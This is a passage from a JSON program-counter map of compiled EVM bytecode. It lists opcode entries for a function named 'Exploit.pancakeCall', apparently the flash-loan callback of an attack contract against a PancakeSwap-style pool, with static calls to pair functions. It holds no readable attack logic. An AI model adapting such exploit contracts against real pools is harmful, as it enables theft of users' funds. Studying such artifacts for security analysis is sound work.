      ],
      "op": "JUMPI",
      "path": "0"
    },
    "189": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3030,
        3042
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "191": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3044,
        3056
      ],
      "op": "DUP1",
      "path": "0"
    },
    "192": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3089
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x8"
    },
    "194": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3090,
        3094
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1"
    },
    "196": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3090,
        3094
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "197": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3095
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x7"
    },
    "199": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3095
      ],
      "op": "DUP2",
      "path": "0"
    },
    "200": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3095
      ],
      "op": "LT",
      "path": "0"
    },
    "201": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3095
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xD4"
    },
    "204": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3095
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "205": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3095
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xD4"
    },
    "208": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3095
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1344"
    },
    "211": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        3075,
        3095
      ],
      "op": "JUMP",
      "path": "0"
    },
    "212": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3095
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "213": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3095
      ],
      "op": "ADD",
      "path": "0"
    },
    "214": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3095
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "216": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3095
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "217": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3095
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "218": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3095
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "219": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3095
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x100"
    },
    "222": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3095
      ],
      "op": "EXP",
      "path": "0"
    },
    "223": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3095
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "224": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3095
      ],
      "op": "DIV",
      "path": "0"
    },
    "225": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "227": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "229": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "231": {
      "op": "SHL"
    },
    "232": {
      "op": "SUB"
    },
    "233": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3075,
        3095
      ],
      "op": "AND",
      "path": "0"
    },
    "234": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "236": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "238": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "240": {
      "op": "SHL"
    },
    "241": {
      "op": "SUB"
    },
    "242": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3108
      ],
      "op": "AND",
      "path": "0"
    },
    "243": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3108
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x902F1AC"
    },
    "248": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "250": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "251": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "DUP2",
      "path": "0"
    },
    "252": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xFFFFFFFF"
    },
    "257": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "AND",
      "path": "0"
    },
    "258": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "260": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "SHL",
      "path": "0"
    },
    "261": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "DUP2",
      "path": "0"
    },
    "262": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "263": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "265": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "ADD",
      "path": "0"
    },
    "266": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x60"
    },
    "268": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "270": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "271": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "DUP1",
      "path": "0"
    },
    "272": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "DUP4",
      "path": "0"
    },
    "273": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "SUB",
      "path": "0"
    },
    "274": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "DUP2",
      "path": "0"
    },
    "275": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "DUP7",
      "path": "0"
    },
    "276": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "GAS",
      "path": "0"
    },
    "277": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "278": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "279": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "DUP1",
      "path": "0"
    },
    "280": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "281": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x126"
    },
    "284": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "285": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "286": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "288": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "DUP1",
      "path": "0"
    },
    "289": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "290": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "291": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "293": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "REVERT",
      "path": "0"
    },
    "294": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "295": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "POP",
      "path": "0"
    },
    "296": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "POP",
      "path": "0"
    },
    "297": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "POP",
      "path": "0"
    },
    "298": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "POP",
      "path": "0"
    },
    "299": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "301": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "302": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "303": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "305": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "NOT",
      "path": "0"
    },
    "306": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "308": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "DUP3",
      "path": "0"
    },
    "309": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "ADD",
      "path": "0"
    },
    "310": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "AND",
      "path": "0"
    },
    "311": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "DUP3",
      "path": "0"
    },
    "312": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "ADD",
      "path": "0"
    },
    "313": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "DUP1",
      "path": "0"
    },
    "314": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "316": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "317": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "POP",
      "path": "0"
    },
    "318": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "DUP2",
      "path": "0"
    },
    "319": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "ADD",
      "path": "0"
    },
    "320": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "321": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14A"
    },
    "324": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "325": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "326": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1376"
    },
    "329": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        3062,
        3110
      ],
      "op": "JUMP",
      "path": "0"
    },
    "330": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3062,
        3110
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "331": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3029,
        3110
      ],
      "op": "POP",
      "path": "0"
    },
    "332": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "334": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "336": {
      "op": "PUSH1",
      "value": "0x70"
    },
    "338": {
      "op": "SHL"
    },
    "339": {
      "op": "SUB"
    },
    "340": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3029,
        3110
      ],
      "op": "AND",
      "path": "0"
    },
    "341": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3029,
        3110
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "342": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3029,
        3110
      ],
      "op": "POP",
      "path": "0"
    },
    "343": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "345": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "347": {
      "op": "PUSH1",
      "value": "0x70"
    },
    "349": {
      "op": "SHL"
    },
    "350": {
      "op": "SUB"
    },
    "351": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3029,
        3110
      ],
      "op": "AND",
      "path": "0"
    },
    "352": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3029,
        3110
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "353": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3029,
        3110
      ],
      "op": "POP",
      "path": "0"
    },
    "354": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3172
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x8"
    },
    "356": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3173,
        3177
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1"
    },
    "358": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3173,
        3177
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "359": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3178
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x7"
    },
    "361": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3178
      ],
      "op": "DUP2",
      "path": "0"
    },
    "362": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3178
      ],
      "op": "LT",
      "path": "0"
    },
    "363": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3178
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x176"
    },
    "366": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3178
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "367": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3178
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x176"
    },
    "370": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3178
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1344"
    },
    "373": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        3158,
        3178
      ],
      "op": "JUMP",
      "path": "0"
    },
    "374": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3178
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "375": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3178
      ],
      "op": "ADD",
      "path": "0"
    },
    "376": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3178
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "378": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3178
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "379": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3178
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "380": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3178
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "381": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3178
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x100"
    },
    "384": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3178
      ],
      "op": "EXP",
      "path": "0"
    },
    "385": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3178
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "386": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3178
      ],
      "op": "DIV",
      "path": "0"
    },
    "387": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "389": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "391": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "393": {
      "op": "SHL"
    },
    "394": {
      "op": "SUB"
    },
    "395": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3158,
        3178
      ],
      "op": "AND",
      "path": "0"
    },
    "396": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "398": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "400": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "402": {
      "op": "SHL"
    },
    "403": {
      "op": "SUB"
    },
    "404": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3186
      ],
      "op": "AND",
      "path": "0"
    },
    "405": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3186
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xD21220A7"
    },
    "410": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "412": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "413": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "DUP2",
      "path": "0"
    },
    "414": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xFFFFFFFF"
    },
    "419": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "AND",
      "path": "0"
    },
    "420": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "422": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "SHL",
      "path": "0"
    },
    "423": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "DUP2",
      "path": "0"
    },
    "424": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "425": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "427": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "ADD",
      "path": "0"
    },
    "428": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "430": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "432": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "433": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "DUP1",
      "path": "0"
    },
    "434": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "DUP4",
      "path": "0"
    },
    "435": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "SUB",
      "path": "0"
    },
    "436": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "DUP2",
      "path": "0"
    },
    "437": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "DUP7",
      "path": "0"
    },
    "438": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "GAS",
      "path": "0"
    },
    "439": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "440": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "441": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "DUP1",
      "path": "0"
    },
    "442": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "443": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1C8"
    },
    "446": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "447": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "448": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "450": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "DUP1",
      "path": "0"
    },
    "451": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "452": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "453": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "455": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "REVERT",
      "path": "0"
    },
    "456": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "457": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "POP",
      "path": "0"
    },
    "458": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "POP",
      "path": "0"
    },
    "459": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "POP",
      "path": "0"
    },
    "460": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "POP",
      "path": "0"
    },
    "461": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "463": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "464": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "465": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "467": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "NOT",
      "path": "0"
    },
    "468": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "470": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "DUP3",
      "path": "0"
    },
    "471": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "ADD",
      "path": "0"
    },
    "472": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "AND",
      "path": "0"
    },
    "473": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "DUP3",
      "path": "0"
    },
    "474": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "ADD",
      "path": "0"
    },
    "475": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "DUP1",
      "path": "0"
    },
    "476": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "478": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "479": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "POP",
      "path": "0"
    },
    "480": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "DUP2",
      "path": "0"
    },
    "481": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "ADD",
      "path": "0"
    },
    "482": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "483": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1EC"
    },
    "486": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "487": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "488": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x13C6"
    },
    "491": {
      "fn": "Exploit.pancakeCall",
      "jump": "i",
      "offset": [
        3145,
        3188
      ],
      "op": "JUMP",
      "path": "0"
    },
    "492": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3145,
        3188
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "493": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3136,
        3140
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x2"
    },
    "495": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3136,
        3140
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "496": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "498": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "500": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "502": {
      "op": "SHL"
    },
    "503": {
      "op": "SUB"
    },
    "504": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3128,
        3188
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "505": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3128,
        3188
      ],
      "op": "DUP3",
      "path": "0"
    },
    "506": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3128,
        3188
      ],
      "op": "AND",
      "path": "0"
    },
    "507": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3136,
        3140
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "508": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3136,
        3140
      ],
      "op": "AND",
      "path": "0"
    },
    "509": {
      "branch": 22,
      "fn": "Exploit.pancakeCall",
      "offset": [
        3128,
        3188
      ],
      "op": "SUB",
      "path": "0"
    },
    "510": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3124,
        3495
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2AE"
    },
    "513": {
      "branch": 22,
      "fn": "Exploit.pancakeCall",
      "offset": [
        3124,
        3495
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "514": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3249,
        3263
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 1,
      "value": "0x8"
    },
    "516": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3264,
        3268
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1"
    },
    "518": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3264,
        3268
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "519": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3249,
        3269
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x7"
    },
    "521": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3249,
        3269
      ],
      "op": "DUP2",
      "path": "0"
    },
    "522": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3249,
        3269
      ],
      "op": "LT",
      "path": "0"
    },
    "523": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3249,
        3269
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x216"
    },
    "526": {
      "fn": "Exploit.pancakeCall",
      "offset": [
        3249,
        3269
